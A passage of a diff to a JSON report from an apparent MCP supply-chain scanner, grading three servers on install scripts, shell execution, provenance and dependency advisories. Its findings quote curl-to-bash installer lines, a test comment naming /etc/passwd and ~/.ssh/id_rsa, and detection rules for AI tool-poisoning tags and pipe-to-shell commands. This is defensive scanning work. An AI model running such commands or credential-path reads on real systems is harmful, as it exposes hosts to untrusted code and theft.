@@ -1,7 +1,7 @@
 {
  "tool": "atlas-allowlist",
- "version": "0.1-prototype",
- "generated": "2026-10-08T05:47:43+00:00",
+ "version": "0.2-prototype",
+ "generated": "2026-10-08T06:05:30+00:00",
  "input": {
   "display": "examples/demo.mcp.json",
   "kind": "mcp",
@@ -12,7 +12,12 @@
   "generated": "2026-10-08",
   "entries": 100
  },
- "fetch": false,
+ "fetch": true,
+ "osv": true,
+ "policy": {
+  "high_in_skill_or_launch": "review",
+  "require_provenance_for_approve": true
+ },
  "wording": "Verdicts report detected patterns (パターンを検出); they are not a judgement of intent.",
  "docs_checked": "2026-10-08",
  "doc_urls": {
@@ -46,49 +51,142 @@
     }
    ],
    "urls": [],
-   "scan_status": "index",
-   "scan_label": "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）",
+   "scan_status": "fetched",
+   "scan_label": "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み",
    "scan_detail": {
-    "matched": "npm:@modelcontextprotocol/server-filesystem",
     "repo": "https://github.com/modelcontextprotocol/servers",
-    "commit": "5abed86c5317b833dd59907492d56c65981642aa",
+    "commit": "3e805376da81c063c2798410906b5fd134334a43",
+    "ref": "2026.1.14",
+    "files": 16,
+    "package_files": 7,
     "subdir": "src/filesystem",
-    "files": 159,
-    "index_generated": "2026-10-08"
+    "version": "2026.1.14",
+    "tarball": "https://registry.npmjs.org/@modelcontextprotocol/server-filesystem/-/server-filesystem-2026.1.14.tgz",
+    "dp004": {
+     "status": "not-comparable",
+     "compared": 0,
+     "identical": 0,
+     "differ": 0,
+     "only_in_package": 0,
+     "build_output": 5,
+     "script_diffs": []
+    },
+    "osv": {
+     "status": "ok",
+     "mal_ids": [],
+     "package": {
+      "name": "@modelcontextprotocol/server-filesystem",
+      "version": "2026.1.14",
+      "pinned": true,
+      "ids": [
+       "GHSA-hc55-p739-j48w",
+       "GHSA-q66q-fx2p-7w4m"
+      ],
+      "mal": [],
+      "affecting": []
+     },
+     "deps_checked": 5
+    }
    },
    "trust": {
-    "trust": 71,
-    "grade": "B",
+    "trust": 69,
+    "grade": "C",
     "security": 100,
-    "provenance": 30,
+    "provenance": 20,
     "maintenance": 25,
     "penalties": [],
     "caps": [],
     "badges": [],
-    "quarantined": false
+    "quarantined": false,
+    "changed_behaviour": false
    },
-   "grade": "B",
-   "score": 71,
-   "recommendation": "approve",
-   "recommendation_ja": "承認推奨",
-   "verdict": "Grade B (71/100) - 1 pattern(s) detected / パターンを検出: 1件 - approve / 承認推奨",
+   "grade": "C",
+   "score": 69,
+   "recommendation": "review",
+   "recommendation_ja": "要レビュー",
+   "verdict": "Grade C (69/100) - 5 pattern(s) detected / パターンを検出: 5件 - review / 要レビュー",
    "reasons": [
-    "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）"
+    "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み"
    ],
+   "provenance_inputs": {
+    "pinned_launch": true,
+    "repo_matches_package": false,
+    "osi_license": true
+   },
+   "policy_notes": [],
    "evidence": [
-    "[info] ATL-IN-001 https://github.com/modelcontextprotocol/servers@5abed86c5317:src/filesystem/package.json [src] prepare: npm run build"
+    "provenance: repo_matches_package=no (DP-004 not-comparable); provenance_attested=no (npm dist.attestations); osi_license=yes (MIT); pinned_launch=yes",
+    "DP-004: not comparable (build output only: 5 files) @ 2026.1.14",
+    "OSV: @modelcontextprotocol/server-filesystem@2026.1.14: 0 advisory id(s) affect this version (2 for any version); 5 direct dep(s) checked, 3 with advisories (estimated versions)",
+    "[info] ATL-DP-002 osv:npm/@modelcontextprotocol/server-filesystem#dependencies [src] @modelcontextprotocol/sdk@1.25.2 (estimated: lowest version in range): GHSA-345p-7cg4-v4c7, GHSA-6qxp-vccf-f47h",
+    "[info] ATL-DP-002 osv:npm/@modelcontextprotocol/server-filesystem#dependencies [src] diff@5.1.0 (estimated: lowest version in range): GHSA-73rr-hh4g-fpgx",
+    "[info] ATL-DP-002 osv:npm/@modelcontextprotocol/server-filesystem#dependencies [src] minimatch@10.0.1 (estimated: lowest version in range): GHSA-23c5-xmqv-rm74, GHSA-3ppc-4f35-3m26, GHSA-7r86-cg39-jmmj",
+    "[info] ATL-DP-004 npm:@modelcontextprotocol/server-filesystem@2026.1.14 [src] not comparable (build output only): 5 build-output files, 0 source files",
+    "[info] ATL-IN-001 https://github.com/modelcontextprotocol/servers@3e805376da81:src/filesystem/package.json [src] prepare: npm run build"
    ],
    "findings": [
     {
      "rule": "ATL-IN-001",
      "sev": "info",
-     "file": "https://github.com/modelcontextprotocol/servers@5abed86c5317:src/filesystem/package.json",
+     "file": "https://github.com/modelcontextprotocol/servers@3e805376da81:src/filesystem/package.json",
      "line": 0,
      "snippet": "prepare: npm run build",
      "ctx": "src",
      "title": "npm install-time lifecycle script",
      "method": "manifest",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-DP-004",
+     "sev": "info",
+     "file": "npm:@modelcontextprotocol/server-filesystem@2026.1.14",
+     "line": 0,
+     "snippet": "not comparable (build output only): 5 build-output files, 0 source files",
+     "ctx": "src",
+     "title": "Package vs repo: not comparable (build output only)",
+     "source": "dp004",
+     "method": "meta",
+     "stats": {
+      "compared": 0,
+      "identical": 0,
+      "differ": 0,
+      "only_in_package": 0,
+      "build_output": 5,
+      "script_diffs": []
+     }
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@modelcontextprotocol/server-filesystem#dependencies",
+     "line": 0,
+     "snippet": "@modelcontextprotocol/sdk@1.25.2 (estimated: lowest version in range): GHSA-345p-7cg4-v4c7, GHSA-6qxp-vccf-f47h",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@modelcontextprotocol/server-filesystem#dependencies",
+     "line": 0,
+     "snippet": "diff@5.1.0 (estimated: lowest version in range): GHSA-73rr-hh4g-fpgx",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@modelcontextprotocol/server-filesystem#dependencies",
+     "line": 0,
+     "snippet": "minimatch@10.0.1 (estimated: lowest version in range): GHSA-23c5-xmqv-rm74, GHSA-3ppc-4f35-3m26, GHSA-7r86-cg39-jmmj",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
     }
    ]
   },
@@ -99,51 +197,135 @@
    "config": {
     "command": "uvx",
     "args": [
-     "mcp-server-fetch==2026.1.26"
+     "mcp-server-fetch==2026.8.18"
     ]
    },
    "packages": [
     {
      "eco": "pypi",
      "name": "mcp-server-fetch",
-     "version": "2026.1.26",
+     "version": "2026.8.18",
      "pinned": true,
      "kind": "registry",
-     "raw": "mcp-server-fetch==2026.1.26"
+     "raw": "mcp-server-fetch==2026.8.18"
     }
    ],
    "urls": [],
-   "scan_status": "index",
-   "scan_label": "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）",
+   "scan_status": "fetched",
+   "scan_label": "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み",
    "scan_detail": {
-    "matched": "pypi:mcp-server-fetch",
     "repo": "https://github.com/modelcontextprotocol/servers",
-    "commit": "5abed86c5317b833dd59907492d56c65981642aa",
+    "commit": "644cbe65648f1d6c687b3b647683e1aaa4ed1eba",
+    "ref": "2026.8.18",
+    "files": 11,
+    "package_files": 13,
     "subdir": "src/fetch",
-    "files": 159,
-    "index_generated": "2026-10-08"
+    "version": "2026.8.18",
+    "tarball": "https://files.pythonhosted.org/packages/ba/6c/db2e93b243c74c06c2b939af7fc2349df6048754073a1f4966ddfb065286/mcp_server_fetch-2026.8.18.tar.gz",
+    "dp004": {
+     "status": "clean",
+     "compared": 5,
+     "identical": 5,
+     "differ": 0,
+     "only_in_package": 0,
+     "build_output": 0,
+     "script_diffs": []
+    },
+    "osv": {
+     "status": "ok",
+     "mal_ids": [],
+     "package": {
+      "name": "mcp-server-fetch",
+      "version": "2026.8.18",
+      "pinned": true,
+      "ids": [],
+      "mal": [],
+      "affecting": []
+     },
+     "deps_checked": 7
+    }
    },
    "trust": {
-    "trust": 71,
+    "trust": 74,
     "grade": "B",
     "security": 100,
-    "provenance": 30,
+    "provenance": 40,
     "maintenance": 25,
     "penalties": [],
     "caps": [],
     "badges": [],
-    "quarantined": false
+    "quarantined": false,
+    "changed_behaviour": false
    },
    "grade": "B",
-   "score": 71,
+   "score": 74,
    "recommendation": "approve",
    "recommendation_ja": "承認推奨",
-   "verdict": "Grade B (71/100) - no pattern detected / パターン検出なし - approve / 承認推奨",
+   "verdict": "Grade B (74/100) - 4 pattern(s) detected / パターンを検出: 4件 - approve / 承認推奨",
    "reasons": [
-    "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）"
+    "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み"
    ],
-   "evidence": [],
-   "findings": []
+   "provenance_inputs": {
+    "pinned_launch": true,
+    "repo_matches_package": true,
+    "osi_license": true
+   },
+   "policy_notes": [],
+   "evidence": [
+    "provenance: repo_matches_package=yes (DP-004 clean); provenance_attested=no (PyPI: not read); osi_license=yes (MIT); pinned_launch=yes",
+    "DP-004: clean - 5 identical, 0 differ, 0 only in package, script diffs: none @ 2026.8.18",
+    "OSV: mcp-server-fetch@2026.8.18: 0 advisory id(s) affect this version (0 for any version); 7 direct dep(s) checked, 4 with advisories (estimated versions)",
+    "[info] ATL-DP-002 osv:PyPI/mcp-server-fetch#dependencies [src] markdownify@0.13.1 (estimated: lowest version in range): GHSA-7mpr-5m44-h73r, PYSEC-2026-1604",
+    "[info] ATL-DP-002 osv:PyPI/mcp-server-fetch#dependencies [src] protego@0.3.1 (estimated: lowest version in range): GHSA-wjmf-p669-5m5p, PYSEC-2026-3906",
+    "[info] ATL-DP-002 osv:PyPI/mcp-server-fetch#dependencies [src] pydantic@2.0.0 (estimated: lowest version in range): GHSA-mr82-8j83-vxmv, PYSEC-2026-1812",
+    "[info] ATL-DP-002 osv:PyPI/mcp-server-fetch#dependencies [src] requests@2.32.3 (estimated: lowest version in range): GHSA-9hjg-9r4m-mvj7, GHSA-gc5v-m9x4-r6x2, PYSEC-2026-1872, PYSEC-2026-2275"
+   ],
+   "findings": [
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:PyPI/mcp-server-fetch#dependencies",
+     "line": 0,
+     "snippet": "markdownify@0.13.1 (estimated: lowest version in range): GHSA-7mpr-5m44-h73r, PYSEC-2026-1604",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:PyPI/mcp-server-fetch#dependencies",
+     "line": 0,
+     "snippet": "protego@0.3.1 (estimated: lowest version in range): GHSA-wjmf-p669-5m5p, PYSEC-2026-3906",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:PyPI/mcp-server-fetch#dependencies",
+     "line": 0,
+     "snippet": "pydantic@2.0.0 (estimated: lowest version in range): GHSA-mr82-8j83-vxmv, PYSEC-2026-1812",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:PyPI/mcp-server-fetch#dependencies",
+     "line": 0,
+     "snippet": "requests@2.32.3 (estimated: lowest version in range): GHSA-9hjg-9r4m-mvj7, GHSA-gc5v-m9x4-r6x2, PYSEC-2026-1872, PYSEC-2026-2275",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    }
+   ]
   },
   {
    "name": "desktop-commander",
@@ -167,21 +349,48 @@
     }
    ],
    "urls": [],
-   "scan_status": "index",
-   "scan_label": "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）",
+   "scan_status": "fetched",
+   "scan_label": "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み",
    "scan_detail": {
-    "matched": "npm:@wonderwhy-er/desktop-commander",
-    "repo": "https://github.com/wonderwhy-er/DesktopCommanderMCP",
-    "commit": "ea3ed35a7be9f2a3ea3e89185ff9bbb03fe5ab57",
+    "repo": "https://github.com/wonderwhy-er/desktopcommandermcp",
+    "commit": "c774c3b505de990219637ecdc9a830c8772fae9d",
+    "ref": "v0.2.52",
+    "files": 324,
+    "package_files": 249,
     "subdir": null,
-    "files": 332,
-    "index_generated": "2026-10-08"
+    "version": "0.2.52",
+    "tarball": "https://registry.npmjs.org/@wonderwhy-er/desktop-commander/-/desktop-commander-0.2.52.tgz",
+    "dp004": {
+     "status": "not-comparable",
+     "compared": 0,
+     "identical": 0,
+     "differ": 0,
+     "only_in_package": 0,
+     "build_output": 120,
+     "script_diffs": []
+    },
+    "osv": {
+     "status": "ok",
+     "mal_ids": [],
+     "package": {
+      "name": "@wonderwhy-er/desktop-commander",
+      "version": "0.2.52",
+      "pinned": false,
+      "ids": [
+       "GHSA-5xx3-j724-wmx5",
+       "GHSA-r87g-78mx-3wg4"
+      ],
+      "mal": [],
+      "affecting": []
+     },
+     "deps_checked": 35
+    }
    },
    "trust": {
-    "trust": 36,
+    "trust": 38,
     "grade": "D",
     "security": 45,
-    "provenance": 20,
+    "provenance": 30,
     "maintenance": 25,
     "penalties": [
      {
@@ -217,27 +426,38 @@
     "badges": [
      "shell-exec"
     ],
-    "quarantined": false
+    "quarantined": false,
+    "changed_behaviour": false
    },
    "grade": "D",
-   "score": 36,
+   "score": 38,
    "recommendation": "deny",
    "recommendation_ja": "拒否推奨",
-   "verdict": "Grade D (36/100) - 56 pattern(s) detected / パターンを検出: 56件 - deny / 拒否推奨",
+   "verdict": "Grade D (38/100) - 63 pattern(s) detected / パターンを検出: 63件 - deny / 拒否推奨",
    "reasons": [
     "-25.0 ATL-IN-001 (high, src, x2): npm install-time lifecycle script - pattern detected",
     "-20.0 ATL-TP-001 (high, src, x1): Pseudo-XML instruction tag (<IMPORTANT>, <SYSTEM> ...) typical of tool poisoning - pattern detected",
     "-8.0 ATL-UP-001 (medium, src, x1): Floating version in launch config (unpinned / @latest / :latest) - pattern detected",
     "capability badges: shell-exec",
-    "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）"
+    "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み"
    ],
+   "provenance_inputs": {
+    "pinned_launch": false,
+    "repo_matches_package": false,
+    "provenance_attested": true,
+    "osi_license": true
+   },
+   "policy_notes": [],
    "evidence": [
-    "[high] ATL-IN-001 https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:package.json [src] postinstall: node dist/track-installation.js && node dist/npm-scripts/verify-ripgrep.js || node -e \"process.exit(0)\"",
-    "[high] ATL-TP-001 https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:src/tools/prompts.ts:297 [src] response += `<INSTRUCTION>Output options for user exactly as provided without missing numbers.",
-    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:uninstall-claude-server.js:86 [src] exec('npm --version', (error, stdout, stderr) => {",
-    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:uninstall-claude-server.js:422 [src] exec(actualCommand, { timeout: 10000 }, (error, stdout, stderr) => {",
-    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:track-installation.js:109 [src] execSync(`ps -p ${ppid} -o command=`, { encoding: 'utf8' })",
-    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:setup-claude-server.js:128 [src] exec('npm --version', (error, stdout, stderr) => {"
+    "provenance: repo_matches_package=no (DP-004 not-comparable); provenance_attested=yes (npm dist.attestations); osi_license=yes (MIT); pinned_launch=no",
+    "DP-004: not comparable (build output only: 120 files) @ v0.2.52",
+    "OSV: @wonderwhy-er/desktop-commander@0.2.52: 0 advisory id(s) affect this version (2 for any version); 35 direct dep(s) checked, 6 with advisories (estimated versions)",
+    "[high] ATL-IN-001 https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:package.json [src] postinstall: node dist/track-installation.js && node dist/npm-scripts/verify-ripgrep.js || node -e \"process.exit(0)\"",
+    "[high] ATL-TP-001 https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/tools/prompts.ts:297 [src] response += `<INSTRUCTION>Output options for user exactly as provided without missing numbers.",
+    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:uninstall-claude-server.js:86 [src] exec('npm --version', (error, stdout, stderr) => {",
+    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:uninstall-claude-server.js:422 [src] exec(actualCommand, { timeout: 10000 }, (error, stdout, stderr) => {",
+    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:track-installation.js:109 [src] execSync(`ps -p ${ppid} -o command=`, { encoding: 'utf8' })",
+    "[medium] ATL-CE-001 https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:setup-claude-server.js:128 [src] exec('npm --version', (error, stdout, stderr) => {"
    ],
    "findings": [
     {
@@ -253,31 +473,31 @@
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:uninstall-claude-server.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:uninstall-claude-server.js",
      "line": 86,
      "snippet": "exec('npm --version', (error, stdout, stderr) => {",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:uninstall-claude-server.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:uninstall-claude-server.js",
      "line": 422,
      "snippet": "exec(actualCommand, { timeout: 10000 }, (error, stdout, stderr) => {",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-RF-001",
      "sev": "low",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:README.md",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:README.md",
      "line": 120,
      "snippet": "curl -fsSL https://raw.githubusercontent.com/wonderwhy-er/DesktopCommanderMCP/refs/heads/main/install.sh | bash",
      "ctx": "docs",
@@ -285,70 +505,111 @@
      "method": "regex",
      "loc": "fenced",
      "why": "installer one-liner in docs/CI",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:track-installation.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:track-installation.js",
      "line": 109,
      "snippet": "execSync(`ps -p ${ppid} -o command=`, { encoding: 'utf8' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:track-installation.js",
+     "line": 109,
+     "snippet": "const parentCmd = execSync(`ps -p ${ppid} -o command=`, { encoding: 'utf8' }).trim();",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
     },
     {
      "rule": "ATL-IN-001",
      "sev": "high",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:package.json",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:package.json",
      "line": 0,
      "snippet": "postinstall: node dist/track-installation.js && node dist/npm-scripts/verify-ripgrep.js || node -e \"process.exit(0)\"",
      "ctx": "src",
      "title": "npm install-time lifecycle script",
      "method": "manifest",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-IN-001",
      "sev": "info",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:package.json",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:package.json",
      "line": 0,
      "snippet": "prepare: npm run build",
      "ctx": "src",
      "title": "npm install-time lifecycle script",
      "method": "manifest",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:setup-claude-server.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:setup-claude-server.js",
      "line": 128,
      "snippet": "exec('npm --version', (error, stdout, stderr) => {",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:setup-claude-server.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:setup-claude-server.js",
      "line": 544,
      "snippet": "exec(actualCommand, { timeout: 10000 }, (error, stdout, stderr) => {",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-RF-001",
+     "sev": "critical",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:skills/terminal/SKILL.md",
+     "line": 112,
+     "snippet": "(`curl ... | sh`) — that's untrusted code execution; show it and confirm first.",
+     "ctx": "skill",
+     "title": "Pipe-to-shell remote script (curl | sh)",
+     "method": "regex",
+     "loc": "prose",
+     "suppressed": true,
+     "why": "placeholder, not a concrete command",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-RF-001",
+     "sev": "critical",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:skills/terminal/SKILL.md",
+     "line": 166,
+     "snippet": "- Anything piping remote content into a shell (`curl ... | sh`).",
+     "ctx": "skill",
+     "title": "Pipe-to-shell remote script (curl | sh)",
+     "method": "regex",
+     "loc": "prose",
+     "suppressed": true,
+     "why": "placeholder, not a concrete command",
+     "source": "fetch"
     },
     {
      "rule": "ATL-RF-001",
      "sev": "low",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:skills/ai-tools-setup/references/hermes.md",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:skills/ai-tools-setup/references/hermes.md",
      "line": 26,
      "snippet": "curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
      "ctx": "docs",
@@ -356,540 +617,948 @@
      "method": "regex",
      "loc": "fenced",
      "why": "installer one-liner in docs/CI",
-     "source": "index"
-    },
-    {
-     "rule": "ATL-CE-001",
-     "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:src/remote-device/diagnostics/report.ts",
-     "line": 180,
-     "snippet": "exec('npm --version', {",
-     "ctx": "src",
-     "title": "Shell command execution (AST: child_process.exec)",
-     "method": "ast",
-     "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-TP-001",
      "sev": "high",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:src/tools/prompts.ts",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/tools/prompts.ts",
      "line": 297,
      "snippet": "response += `<INSTRUCTION>Output options for user exactly as provided without missing numbers.",
      "ctx": "src",
      "title": "Pseudo-XML instruction tag (<IMPORTANT>, <SYSTEM> ...) typical of tool poisoning",
      "method": "regex",
      "loc": "string:plain",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-TP-001",
+     "sev": "high",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/tools/prompts.ts",
+     "line": 298,
+     "snippet": "Its important so user can choose an options by entering number only. Also do not forget new lines between numbers for easy reading</INSTRUCTION>\\n\\n`;",
+     "ctx": "src",
+     "title": "Pseudo-XML instruction tag (<IMPORTANT>, <SYSTEM> ...) typical of tool poisoning",
+     "method": "regex",
+     "loc": "string:plain",
+     "suppressed": true,
+     "why": "negated or cited as an example",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-TP-002",
+     "sev": "high",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/tools/prompts.ts",
+     "line": 300,
+     "snippet": "// AI reference mapping (do not show to user):",
+     "ctx": "src",
+     "title": "Concealment instruction (hide behaviour from the user)",
+     "method": "regex",
+     "loc": "comment~",
+     "suppressed": true,
+     "why": "inside a code comment (heuristic)",
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:src/utils/ripgrep-resolver.ts",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/utils/ripgrep-resolver.ts",
      "line": 40,
      "snippet": "execSync(`${whichCmd} ${systemRg}`, { encoding: 'utf-8' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:src/utils/system-info.ts",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/utils/ripgrep-resolver.ts",
+     "line": 40,
+     "snippet": "const result = execSync(`${whichCmd} ${systemRg}`, { encoding: 'utf-8' }).trim().split(/\\r?\\n/)[0];",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/utils/system-info.ts",
      "line": 475,
      "snippet": "execSync(`${cmd} --version`, {",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/run-all-tests.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:src/utils/system-info.ts",
+     "line": 475,
+     "snippet": "const version = execSync(`${cmd} --version`, {",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/run-all-tests.js",
      "line": 34,
      "snippet": "spawn(command, args, {",
      "ctx": "test",
      "title": "Shell command execution (AST: spawn with shell option)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/test-enhanced-repl.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/test-enhanced-repl.js",
      "line": 12,
      "snippet": "execSync('command -v python3', { stdio: 'ignore' })",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/test-enhanced-repl.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/test-enhanced-repl.js",
      "line": 17,
      "snippet": "execSync('command -v python', { stdio: 'ignore' })",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-FS-001",
+     "sev": "low",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/test-symlink-security.js",
+     "line": 47,
+     "snippet": "// Create a file in the restricted directory (simulates /etc/passwd or ~/.ssh/id_rsa)",
+     "ctx": "test",
+     "title": "Code references a credential / agent-config path",
+     "method": "regex",
+     "suppressed": true,
+     "why": "inside a code comment (AST)",
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-threadpool-starvation.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-threadpool-starvation.js",
